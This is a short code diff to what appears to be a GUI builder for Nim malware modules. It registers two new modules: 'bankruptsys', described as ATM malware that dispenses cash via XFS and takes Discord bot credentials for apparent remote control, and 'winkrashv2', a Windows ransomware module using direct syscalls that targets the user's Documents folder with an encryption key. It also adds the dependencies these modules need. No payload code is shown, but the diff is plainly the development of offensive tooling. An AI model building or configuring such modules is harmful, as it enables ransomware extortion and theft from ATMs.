@@ -42,6 +42,12 @@ MODULES = {
     },
     'module/byovf': {
         'desc': 'Bring your own Nim file and embed secondary files (e.g., drivers, DLLs).'
+    },
+    'module/bankruptsys': {
+        'desc': 'An ATM malware module to dispense cash via XFS.'
+    },
+    'module/winkrashv2': {
+        'desc': 'A ransomware module for Windows that uses direct syscalls.'
     }
 }
 
@@ -94,6 +100,14 @@ MODULE_OPTIONS = {
     'module/byovf': {
         'nimFile': 'path/to/your/module.nim',
         'embedFiles': 'path/to/driver.sys,path/to/cert.pem'
+    },
+    'module/bankruptsys': {
+        'discordToken': 'YOUR_DISCORD_BOT_TOKEN',
+        'creatorId': 'YOUR_DISCORD_USER_ID',
+    },
+    'module/winkrashv2': {
+        'key': 'secret',
+        'targetDir': '$HOME/Documents',
     }
 }
 
@@ -1647,7 +1661,7 @@ class RABIDSGUI(QMainWindow):
 
     def run_nim_installer(self):
         commands = [
-            ("nimble", "install", "winim", "openssl", "discord", "nimcrypto", "clipb"),
+            ("nimble", "install", "winim", "openssl", "discord", "nimcrypto", "clipb", "dimscord", "httpclient", "threadpool"),
         ]
         self.run_dependency_installer(commands)
 
